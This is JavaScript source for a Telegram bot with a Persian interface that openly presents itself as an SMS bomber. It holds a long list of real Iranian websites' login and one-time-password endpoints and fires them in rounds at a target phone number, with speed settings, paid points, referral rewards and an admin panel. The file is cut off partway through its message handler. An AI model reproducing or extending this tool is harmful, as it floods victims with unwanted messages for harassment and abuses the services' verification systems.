// ==================== تنظیمات ====================
const ADMIN_ID = 6887901539;
const ADMIN_USERNAME = "@ALI_ARMINEH_xLaX";
const HELP_LINK = "https://rubika.ir/join/BBEGBIJFH0TPJPZVKHBNGAMEOIGJUHPQ";

const BUY_POINTS_PRICES = {
  10: 20, 20: 40, 30: 60, 40: 80, 50: 100,
  100: 150, 200: 300, 300: 450, 400: 600, 500: 700
};

// ==================== حافظه موقت (جایگزین bot_data.json) ====================
const users = new Map();
const bannedUsers = new Set();
const personalBlacklist = new Set();
const ownerBlacklist = new Set();
const serviceStats = {};
const referrals = new Map();
const points = new Map();
const dailyRewards = new Map();
const freeBombs = new Map();
const userStates = new Map();
const lastOperation = new Map();
const stopEvents = new Map();

let botSettings = { cooldown_seconds: 60 };

// ==================== سرویس‌های بمبر ====================
const SERVICES = {
  divar: async (p) => {
    try {
      const r = await fetch('https://api.divar.ir/v5/auth/authenticate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  nobatir: async (p) => {
    try {
      const body = `------WebKitFormBoundary\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n${p.replace('+98', '0')}\r\n------WebKitFormBoundary--\r\n`;
      const r = await fetch('https://nobat.ir/api/public/patient/login/phone', { method: 'POST', headers: {'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary'}, body });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  alopeyk_login: async (p) => {
    try {
      const r = await fetch('https://api.alopeyk.com/api/v2/login?platform=pwa', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type: "CUSTOMER", phone: p.replace('+98', '')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  alopeyk_signup: async (p) => {
    try {
      const r = await fetch('https://api.alopeyk.com/api/v2/register-customer?platform=pwa', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type: "CUSTOMER", firstname: "تست", lastname: "تست", phone: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  shahrefarsh: async (p) => {
    try {
      const r = await fetch('https://shahrfarsh.com/Account/Login', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `phoneNumber=${p.replace('+98', '0')}` });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  snapp_express: async (p) => {
    try {
      const r = await fetch('https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `cellphone=${p.replace('+98', '0')}&captcha=&optionalLoginToken=true&local=` });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  azki: async (p) => {
    try {
      const r = await fetch('https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phoneNumber: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  digikala_jet: async (p) => {
    try {
      const r = await fetch('https://api.digikalajet.ir/user/login-register/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  snapp_drivers: async (p) => {
    try {
      const r = await fetch('https://digitalsignup.snapp.ir/ds3/api/v3/otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cellphone: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  ostadkar: async (p) => {
    try {
      const r = await fetch('https://api.ostadkr.com/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  miare: async (p) => {
    try {
      const r = await fetch('https://www.miare.ir/api/otp/driver/request/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone_number: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  tapsi_drivers: async (p) => {
    try {
      const r = await fetch('https://api.tapsi.ir/api/v2.2/user', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({credential: {phoneNumber: p.replace('+98', '0'), role: 'DRIVER'}, otpOption: 'SMS'}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  tapsi_passenger: async (p) => {
    try {
      const r = await fetch('https://api.tapsi.ir/api/v2.2/user', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({credential: {phoneNumber: p.replace('+98', '0'), role: 'PASSENGER'}, otpOption: 'SMS'}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  banimode: async (p) => {
    try {
      const r = await fetch('https://mobapi.banimode.com/api/v2/auth/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  taaghche_login: async (p) => {
    try {
      const r = await fetch('https://gw.taaghche.com/v4/site/auth/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({contact: p.replace('+98', '0'), forceOtp: false}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  taaghche_signup: async (p) => {
    try {
      const r = await fetch('https://gw.taaghche.com/v4/site/auth/signup', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({contact: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  mobit: async (p) => {
    try {
      const r = await fetch('https://api.mobit.ir/api/web/v8/register/register', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({number: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  jabama: async (p) => {
    try {
      const r = await fetch('https://taraazws.jabama.com/api/v4/account/send-code', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  ghabzino: async (p) => {
    try {
      const r = await fetch('https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({Parameters: {MobileNumber: p.replace('+98', '0')}}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  komodaa: async (p) => {
    try {
      const r = await fetch('https://api.komodaa.com/api/v2.6/loginRC/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone_number: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  barghe_man: async (p) => {
    try {
      const r = await fetch('https://uiapi2.saapa.ir/api/otp/sendCode', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  vandar: async (p) => {
    try {
      const r = await fetch('https://api.vandar.io/account/v1/check/mobile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  pinorest: async (p) => {
    try {
      const r = await fetch('https://api.pinorest.com/frontend/auth/login/mobile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  tetherland: async (p) => {
    try {
      const r = await fetch('https://service.tetherland.com/api/v5/login-register', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  alibaba: async (p) => {
    try {
      const r = await fetch('https://ws.alibaba.ir/api/v3/account/mobile/otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phoneNumber: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  drdr: async (p) => {
    try {
      const r = await fetch('https://drdr.ir/api/v3/auth/login/mobile/init', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  drnext: async (p) => {
    try {
      const r = await fetch('https://cyclops.drnext.ir/v1/patients/auth/send-verification-token', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  classino: async (p) => {
    try {
      const r = await fetch('https://student.classino.com/otp/v1/api/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  takshopaccessorise: async (p) => {
    try {
      const r = await fetch('https://takshopaccessorise.ir/api/v1/sessions/login_request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile_phone: p.replace('+98', '0')}) });
      return r.status >= 200 && r.status < 300;
    } catch { return false; }
  },
  snap: async (p) => {
    try {
      const r = await fetch('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cellphone: p}) });
      return true;
    } catch { return false; }
  },
  tap30: async (p) => {
    try {
      const r = await fetch('https://tap33.me/api/v2/user', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({credential: {phoneNumber: "0" + p.split("+98")[1], role: "PASSENGER"}}) });
      return true;
    } catch { return false; }
  },
  torob: async (p) => {
    try {
      const r = await fetch(`https://api.torob.com/a/phone/send-pin/?phone_number=0${p.split('+98')[1]}`, { method: 'GET' });
      return true;
    } catch { return false; }
  },
  snapfood: async (p) => {
    try {
      const r = await fetch('https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cellphone: "0" + p.split("+98")[1]}) });
      return true;
    } catch { return false; }
  },
  digikala: async (p) => {
    try {
      const r = await fetch('https://api.digikala.com/v1/user/otp/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username: "0" + p.split("+98")[1]}) });
      return true;
    } catch { return false; }
  },
  flightio: async (p) => {
    try {
      const r = await fetch('https://flightio.com/api/v2.2/customer/authentication/otp/send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: "0" + p.split("+98")[1]}) });
      return true;
    } catch { return false; }
  },
  sheypoor: async (p) => {
    try {
      const r = await fetch('https://www.sheypoor.com/auth', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username: "0" + p.split("+98")[1]}) });
      return true;
    } catch { return false; }
  },
  basalam: async (p) => {
    try {
      const r = await fetch('https://api.basalam.com/user', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({query: "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }", variables: {mobile: "0" + p.split('+98')[1]}}) });
      return true;
    } catch { return false; }
  },
  sTrip: async (p) => {
    try {
      const r = await fetch('https://www.snapptrip.com/register', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile_phone: "0" + p.split("+98")[1]}) });
      return true;
    } catch { return false; }
  },
  gap: async (p) => {
    try {
      const r = await fetch(`https://core.gap.im/v1/user/add.json?phone=${p.split('+')[1]}`, { method: 'GET' });
      return true;
    } catch { return false; }
  },
  tbourse: async (p) => {
    try {
      const r = await fetch('https://api.irantbours.com:443/api/v1/access/join/mobile/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: "0" + p.split("+98")[1]}) });
      return true;
    } catch { return false; }
  },
  itoll: async (p) => {
    try {
      const r = await fetch('https://app.itoll.com/api/v1/auth/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: "0" + p.split("+98")[1]}) });
      return true;
    } catch { return false; }
  },
  filmnet: async (p) => {
    try {
      const r = await fetch(`https://api-v2.filmnet.ir/access-token/users/${p.replace('+98', '0')}/otp`, { method: 'GET' });
      return true;
    } catch { return false; }
  }
};

// ==================== توابع کمکی ====================
function normalizePhone(phone) {
  const cleaned = phone.replace(/[^\d+]/g, '');
  if (/^(?:\+98|98|0)?(9\d{9})$/.test(cleaned)) {
    return "+98" + cleaned.replace(/^(?:\+98|98|0)?/, '');
  }
  return null;
}

function generateReferralCode(userId) {
  const hash = userId.toString() + Date.now().toString();
  let h = 0;
  for (let i = 0; i < hash.length; i++) {
    h = ((h << 5) - h) + hash.charCodeAt(i);
    h |= 0;
  }
  return Math.abs(h).toString(16).toUpperCase().slice(0, 8).padEnd(8, 'A');
}

function getProgress(percent) {
  const barLen = 10;
  const filled = Math.floor(barLen * percent / 100);
  const bar = "🟩".repeat(filled) + "⬛".repeat(barLen - filled);
  const emojis = ["🌑", "🌒", "🌓", "🌔", "🌕", "🌖", "🌗", "🌘"];
  const idx = Math.floor((percent / 100) * (emojis.length - 1));
  return `[${bar}] ${emojis[idx]}`;
}

function getUserPoints(userId) {
  return points.get(userId.toString()) || 0;
}

function addPoints(userId, amount) {
  const current = points.get(userId.toString()) || 0;
  const newPoints = current + amount;
  points.set(userId.toString(), newPoints);
  return newPoints;
}

function ensureUser(userId) {
  const id = userId.toString();
  if (!users.has(id)) {
    users.set(id, {
      join_date: new Date().toISOString(),
      attack_count: 0,
      total_sms_sent: 0,
      last_active: new Date().toISOString()
    });
    if (!points.has(id)) points.set(id, 0);
  }
}

// ==================== توابع API تلگرام ====================
async function apiRequest(method, params) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(params)
    });
    return await response.json();
  } catch (e) {
    console.error("API Error:", e);
    return null;
  }
}

async function sendMessage(chatId, text, keypad = null) {
  const params = { chat_id: chatId, text: text, parse_mode: "Markdown" };
  if (keypad) params.reply_markup = keypad;
  return await apiRequest("sendMessage", params);
}

async function editMessage(chatId, messageId, text, keypad = null) {
  const params = { chat_id: chatId, message_id: messageId, text: text, parse_mode: "Markdown" };
  if (keypad) params.reply_markup = keypad;
  return await apiRequest("editMessageText", params);
}

async function answerCallback(callbackId) {
  return await apiRequest("answerCallbackQuery", { callback_query_id: callbackId });
}

// ==================== کیبوردها (Reply Keyboard) ====================
function mainKeypad() {
  return {
    keyboard: [
      [{ text: "💣 شروع عملیات جدید" }],
      [{ text: "🎁 اسمس بمبر رایگان" }],
      [{ text: "📊 آمار من" }, { text: "⭐ امتیازات من" }],
      [{ text: "🎁 دریافت پاداش روزانه" }],
      [{ text: "🔗 لینک ارجاع" }, { text: "🔑 وارد کردن کد دعوت" }],
      [{ text: "💰 خرید امتیاز" }],
      [{ text: "🛡 لیست سیاه شخصی" }],
      [{ text: "📢 کانال ما" }, { text: "❓ راهنما" }]
    ],
    resize_keyboard: true
  };
}

function referralCodeKeypad() {
  return {
    keyboard: [
      [{ text: "⏭️ رد کردن" }],
      [{ text: "↪️ بازگشت به منوی اصلی" }]
    ],
    resize_keyboard: true
  };
}

function cancelKeypad(text = "🚫 لغو عملیات") {
  return {
    keyboard: [[{ text: text }]],
    resize_keyboard: true
  };
}

function backKeypad(text = "↪️ بازگشت به منوی اصلی") {
  return {
    keyboard: [[{ text: text }]],
    resize_keyboard: true
  };
}

function attackTypeKeypad() {
  return {
    keyboard: [
      [{ text: "💥 حمله با تمام سرویس‌ها" }],
      [{ text: "🎯 حمله با سرویس‌های منتخب" }],
      [{ text: "↪️ بازگشت" }]
    ],
    resize_keyboard: true
  };
}

function roundsKeypad() {
  return {
    keyboard: [
      [{ text: "۱ دور" }, { text: "۲ دور" }, { text: "۳ دور" }],
      [{ text: "↪️ بازگشت" }]
    ],
    resize_keyboard: true
  };
}

function intensityKeypad() {
  return {
    keyboard: [
      [{ text: "🐌 آهسته" }, { text: "⚡ متوسط" }, { text: "🔥 سریع" }],
      [{ text: "↪️ بازگشت" }]
    ],
    resize_keyboard: true
  };
}

function confirmKeypad() {
  return {
    keyboard: [
      [{ text: "✅ تایید و شروع حمله" }],
      [{ text: "❌ لغو و بازگشت" }]
    ],
    resize_keyboard: true
  };
}

function adminPanelKeypad() {
  return {
    keyboard: [
      [{ text: "📊 آمار کلی" }],
      [{ text: "👥 مدیریت کاربران" }],
      [{ text: "⭐ افزودن امتیاز" }],
      [{ text: "👑 پنل مالک" }],
      [{ text: "🛡 لیست سیاه مالک" }],
      [{ text: "🔒 امنیت و وب‌سرویس" }],
      [{ text: "↪️ خروج" }]
    ],
    resize_keyboard: true
  };
}

function adminUsersKeypad() {
  return {
    keyboard: [
      [{ text: "📊 آمار کاربران" }],
      [{ text: "🟢 کاربران فعال" }, { text: "🔴 کاربران غیرفعال" }],
      [{ text: "🚫 کاربران مسدود" }],
      [{ text: "🚫 مسدود کاربر" }, { text: "✅ رفع مسدودیت" }],
      [{ text: "↪️ بازگشت" }]
    ],
    resize_keyboard: true
  };
}

function buyPointsKeypad() {
  return {
    keyboard: [
      [{ text: "10⭐ = 20تومان" }, { text: "20⭐ = 40تومان" }, { text: "30⭐ = 60تومان" }],
      [{ text: "40⭐ = 80تومان" }, { text: "50⭐ = 100تومان" }],
      [{ text: "100⭐ = 150تومان" }, { text: "200⭐ = 300تومان" }, { text: "300⭐ = 450تومان" }],
      [{ text: "400⭐ = 600تومان" }, { text: "500⭐+100⭐ = 700تومان" }],
      [{ text: "↪️ بازگشت" }]
    ],
    resize_keyboard: true
  };
}

function ownerPanelKeypad() {
  return {
    keyboard: [
      [{ text: "➕ افزودن به لیست سیاه" }],
      [{ text: "➖ حذف از لیست سیاه" }],
      [{ text: "📋 لیست سیاه" }],
      [{ text: "💣 بمب نامحدود" }],
      [{ text: "↪️ بازگشت" }]
    ],
    resize_keyboard: true
  };
}

function referralKeypad() {
  return {
    keyboard: [
      [{ text: "📊 آمار ارجاع" }, { text: "💰 خرید امتیاز" }],
      [{ text: "🔑 وارد کردن کد دعوت" }],
      [{ text: "↪️ بازگشت" }]
    ],
    resize_keyboard: true
  };
}

// ==================== عملیات بمباران ====================
async function bombingRun(chatId, messageId, phone, delay, rounds, selectedServices) {
  let successCount = 0;
  let failCount = 0;
  let lastUpdateText = "";
  
  const servicesList = Object.keys(selectedServices);
  
  for (let round = 1; round <= rounds; round++) {
    if (stopEvents.get(chatId)) break;
    
    const shuffled = [...servicesList].sort(() => Math.random() - 0.5);
    const successfulInRound = [];
    const failedInRound = [];
    
    for (let i = 0; i < shuffled.length; i++) {
      if (stopEvents.get(chatId)) break;
      
      const serviceName = shuffled[i];
      const result = await SERVICES[serviceName](phone);
      
      if (result) {
        successCount++;
        successfulInRound.push(serviceName);
        serviceStats[serviceName] = serviceStats[serviceName] || {success: 0, failure: 0};
        serviceStats[serviceName].success++;
      } else {
        failCount++;
        failedInRound.push(serviceName);
        serviceStats[serviceName] = serviceStats[serviceName] || {success: 0, failure: 0};
        serviceStats[serviceName].failure++;
      }
      
      const progress = Math.floor(((i + 1) / shuffled.length) * 100);
      const successText = successfulInRound.length > 0 ? `✅ موفق (${successfulInRound.length}): ${successfulInRound.join(", ")}` : "";
      const failText = failedInRound.length > 0 ? `\n❌ ناموفق (${failedInRound.length}): ${failedInRound.join(", ")}` : "";
      
      const newText = `🎯 در حال اجرای عملیات...\n\n📱 شماره هدف: \`${phone}\`\n🔄 دور: ${round} / ${rounds}\n\n${getProgress(progress)} ${progress}%\n🔩 سرویس فعلی: ${serviceName}\n\n--- نتایج این دور ---\n${successText}${failText}`;
      
      if (newText !== lastUpdateText) {
        await editMessage(TOKEN, chatId, messageId, newText);
        lastUpdateText = newText;
      }
      
      await new Promise(r => setTimeout(r, delay * 1000));
    }
  }
  
  // آپدیت آمار کاربر
  const userData = users.get(chatId.toString()) || {};
  userData.attack_count = (userData.attack_count || 0) + 1;
  userData.total_sms_sent = (userData.total_sms_sent || 0) + successCount;
  users.set(chatId.toString(), userData);
  
  let finalText;
  if (stopEvents.get(chatId)) {
    finalText = `🚫 عملیات برای شماره \`${phone}\` توسط شما لغو شد.`;
    stopEvents.delete(chatId);
  } else {
    finalText = `✅ عملیات با موفقیت به پایان رسید\n\n📱 شماره هدف: \`${phone}\`\n🔄 دورهای انجام شده: ${rounds}\n\n📈 نتایج نهایی:\n   - ✅ ارسال‌های موفق: ${successCount}\n   - ❌ ارسال‌های ناموفق: ${failCount}`;
  }
  
  await editMessage(TOKEN, chatId, messageId, finalText);
  await sendMessage(chatId, "👇 برای شروع عملیات جدید، از منوی زیر استفاده کنید:", mainKeypad());
}

// ==================== هندلر اصلی ====================
export default {
  async fetch(request, env) {
    global.TOKEN = env.TOKEN;
    
    if (request.method === "GET") {
      return new Response("🤖 Bomber Bot Active ✅");
    }
    
    if (request.method !== "POST") {
      return new Response("Method Not Allowed", { status: 405 });
    }
    
    try {
      const update = await request.json();
      console.log("UPDATE:", JSON.stringify(update));
      
      let chatId = null, text = "", userId = null, messageId = null, callbackData = null, callbackId = null;
      
      if (update.message) {
        chatId = update.message.chat.id;
        text = update.message.text || "";
        userId = update.message.from.id;
        messageId = update.message.message_id;
      }
      
      if (update.callback_query) {
        chatId = update.callback_query.message.chat.id;
        userId = update.callback_query.from.id;
        messageId = update.callback_query.message.message_id;
        callbackData = update.callback_query.data;
        callbackId = update.callback_query.id;
        await answerCallback(callbackId);
      }
      
      if (!chatId) return new Response("OK");
      
      const chatIdStr = chatId.toString();
      const isAdmin = userId === ADMIN_ID;
      
      // چک بن
      if (bannedUsers.has(chatIdStr)) {
        await sendMessage(chatId, "🚫 شما توسط مدیر مسدود شده‌اید.");
        return new Response("OK");
      }
      
      // کاربر جدید
      const isNewUser = !users.has(chatIdStr);
      if (isNewUser) {
        ensureUser(userId);
        
        // چک کد دعوت در /start
        let refCode = null;
        if (text && text.includes("ref=")) {
          refCode = text.split("ref=").pop().trim();
          if (refCode.length === 8) {
            // پردازش ارجاع
            let referrerId = null;
            for (const [uid, refData] of referrals.entries()) {
              if (refData.code === refCode) {
                referrerId = uid;
                break;
              }
            }
            if (referrerId && referrerId !== chatIdStr) {
              if (!referrals.has(chatIdStr)) {
                referrals.set(chatIdStr, {
                  code: generateReferralCode(chatId),
                  referred_by: referrerId,
                  referred_users: []
                });
              }
              const referrerData = referrals.get(referrerId);
              if (!referrerData.referred_users.includes(chatIdStr)) {
                referrerData.referred_users.push(chatIdStr);
              }
              const newPoints = addPoints(referrerId, 1);
              await sendMessage(referrerId, `🎉 یک کاربر جدید با کد دعوت شما وارد شد!\n\n⭐ 1 امتیاز به حساب شما اضافه شد.\nامتیاز فعلی شما: ${newPoints}`);
              await sendMessage(chatId, `🎉 شما با موفقیت دعوت شدید!\n\n🔑 کد دعوت شما: \`${generateReferralCode(chatId)}\``, mainKeypad());
              return new Response("OK");
            }
          }
        }
        
        userStates.set(chatIdStr, { state: "awaiting_referral_code" });
        await sendMessage(chatId,
          `👋 به ربات اسپمر پیامک خوش آمدید!\n\nاگر کد دعوت دارید، آن را وارد کنید.\nدر غیر این صورت روی دکمه 'رد کردن' بزنید.\n\n🔑 کد دعوت شما: \`${generateReferralCode(chatId)}\``,
          referralCodeKeypad());
        return new Response("OK");
      }
      
      // آپدیت آخرین فعالیت
      const userData = users.get(chatIdStr);
      userData.last_active = new Date().toISOString();
      
      const state = userStates.get(chatIdStr) || {};
      
      // ==================== پردازش کد دعوت ====================
      if (state.state === "awaiting_referral_code") {
        if (text === "⏭️ رد کردن") {
          userStates.delete(chatIdStr);
          await sendMessage(chatId, `💣 به ربات اسپمر پیامک پیشرفته خوش آمدید!\n\n🔑 کد دعوت شما: \`${generateReferralCode(chatId)}\``, mainKeypad());
          return new Response("OK");
        }
        if (text === "↪️ بازگشت به منوی اصلی") {
          userStates.delete(chatIdStr);
          await sendMessage(chatId, "💣 به ربات اسپمر پیامک پیشرفته خوش آمدید!", mainKeypad());
          return new Response("OK");
        }
        
        const refCode = text.trim().toUpperCase();
        if (refCode.length === 8) {
          let referrerId = null;
          for (const [uid, refData] of referrals.entries()) {
            if (refData.code === refCode) {
              referrerId = uid;
              break;
            }
          }
          if (referrerId && referrerId !== chatIdStr) {
            if (!referrals.has(chatIdStr)) {
              referrals.set(chatIdStr, {
                code: generateReferralCode(chatId),
                referred_by: referrerId,
                referred_users: []
              });
            }
            const referrerData = referrals.get(referrerId);
            if (!referrerData.referred_users.includes(chatIdStr)) {
              referrerData.referred_users.push(chatIdStr);
            }
            const newPoints = addPoints(referrerId, 1);
            await sendMessage(chatId, `🎉 کد دعوت با موفقیت تایید شد!\n⭐ 1 امتیاز به کاربر دعوت‌کننده تعلق گرفت.\n\n🔑 کد دعوت شما: \`${generateReferralCode(chatId)}\``, mainKeypad());
            userStates.delete(chatIdStr);
            return new Response("OK");
          } else {
            await sendMessage(chatId, "❌ کد دعوت نامعتبر است.", referralCodeKeypad());
            return new Response("OK");
          }
        } else {
          await sendMessage(chatId, "❌ کد دعوت باید ۸ کاراکتر باشد.", referralCodeKeypad());
          return new Response("OK");
        }
      }
      
      if (state.state === "entering_referral_code") {
        if (text === "↪️ بازگشت به منوی اصلی") {
          userStates.delete(chatIdStr);
          await sendMessage(chatId, "↪️ بازگشت به منوی اصلی", mainKeypad());
          return new Response("OK");
        }
        const refCode = text.trim().toUpperCase();
        if (refCode.length === 8) {
          let referrerId = null;
          for (const [uid, refData] of referrals.entries()) {
            if (refData.code === refCode) {
              referrerId = uid;
              break;
            }
          }
          if (referrerId && referrerId !== chatIdStr) {
            if (!referrals.has(chatIdStr)) {
              referrals.set(chatIdStr, {
                code: generateReferralCode(chatId),
                referred_by: referrerId,
                referred_users: []
              });
            }
            const referrerData = referrals.get(referrerId);
            if (!referrerData.referred_users.includes(chatIdStr)) {
              referrerData.referred_users.push(chatIdStr);
            }
            addPoints(referrerId, 1);
            await sendMessage(chatId, `🎉 کد دعوت با موفقیت تایید شد!\n⭐ 1 امتیاز به کاربر دعوت‌کننده تعلق گرفت.`, mainKeypad());
            userStates.delete(chatIdStr);
            return new Response("OK");
          } else {
            await sendMessage(chatId, "❌ کد دعوت نامعتبر است.", backKeypad());
            return new Response("OK");
          }
        } else {
          await sendMessage(chatId, "❌ کد دعوت باید ۸ کاراکتر باشد.", backKeypad());
          return new Response("OK");
        }
      }
      
      // ==================== /start و بازگشت ====================
      if (text === "/start" || text === "↪️ بازگشت به منوی اصلی" || text === "↪️ بازگشت" || text === "↪️ خروج") {
        userStates.delete(chatIdStr);
        await sendMessage(chatId, "💣 به ربات اسپمر پیامک پیشرفته خوش آمدید!", mainKeypad());
        return new Response("OK");
      }
      
      // ==================== پنل ادمین ====================
      if (text === "ALI_ARMINEH" && isAdmin) {
        userStates.set(chatIdStr, { state: "admin_panel" });
        await sendMessage(chatId, "👑 به پنل مدیریت خوش آمدید:", adminPanelKeypad());
        return new Response("OK");
      }
      
      // ==================== دکمه‌های اصلی ====================
      if (text === "💣 شروع عملیات جدید") {
        const userPts = getUserPoints(chatId);
        if (userPts <= 0) {
          await sendMessage(chatId,
            `⚠️ شما امتیاز کافی برای انجام عملیات ندارید!\n\n⭐ امتیاز فعلی: ${userPts}\n\nبرای دریافت امتیاز:\n• دریافت پاداش روزانه (3 امتیاز)\n• دعوت از دوستان (هر دعوت 1 امتیاز)\n• خرید امتیاز از منوی خرید`,
            mainKeypad());
          return new Response("OK");
        }
        userStates.set(chatIdStr, { state: "awaiting_phone" });
        await sendMessage(chatId, "📞 لطفا شماره تلفن هدف را وارد کنید:\n(مثال: 09123456789 یا +989123456789)", backKeypad());
        return new Response("OK");
      }
      
      if (text === "🔗 لینک ارجاع") {
        if (!referrals.has(chatIdStr)) {
          referrals.set(chatIdStr, {
            code: generateReferralCode(chatId),
            referred_by: null,
            referred_users: []
          });
        }
        const refData = referrals.get(chatIdStr);
        const link = `https://t.me/YourBot?start=ref_${refData.code}`;
        await sendMessage(chatId,
          `🔗 لینک ارجاع شما:\n\`${link}\`\n\n📊 آمار ارجاع:\n⭐ امتیاز: ${getUserPoints(chatId)}\n👥 تعداد ارجاع: ${refData.referred_users.length}\n🔑 کد دعوت: \`${refData.code}\`\n\nهر کاربر جدید که با لینک یا کد دعوت شما وارد شود، 1 امتیاز دریافت می‌کنید!`,
          referralKeypad());
        return new Response("OK");
      }
      
      if (text === "🎁 دریافت پاداش روزانه") {
        const lastReward = dailyRewards.get(chatIdStr);
        if (lastReward && Date.now() - lastReward < 24 * 60 * 60 * 1000) {
          const remaining = Math.ceil((24 * 60 * 60 * 1000 - (Date.now() - lastReward)) / (60 * 60 * 1000));
          await sendMessage(chatId, `⏳ هنوز 24 ساعت نگذشته است!\n\n⏰ ${remaining} ساعت دیگر`, mainKeypad());
          return new Response("OK");
        }
        addPoints(chatId, 3);
        dailyRewards.set(chatIdStr, Date.now());
        await sendMessage(chatId, "✅ 3 امتیاز دریافت کردید!", mainKeypad());
        return new Response("OK");
      }
      
      if (text === "🎁 اسمس بمبر رایگان") {
        const lastBomb = freeBombs.get(chatIdStr);
        if (lastBomb && Date.now() - lastBomb < 24 * 60 * 60 * 1000) {
          const remaining = Math.ceil((24 * 60 * 60 * 1000 - (Date.now() - lastBomb)) / (60 * 60 * 1000));
          await sendMessage(chatId, `⏳ هنوز 24 ساعت نگذشته است!\n\n⏰ ${remaining} ساعت دیگر`, mainKeypad());
          return new Response("OK");
        }
        freeBombs.set(chatIdStr, Date.now());
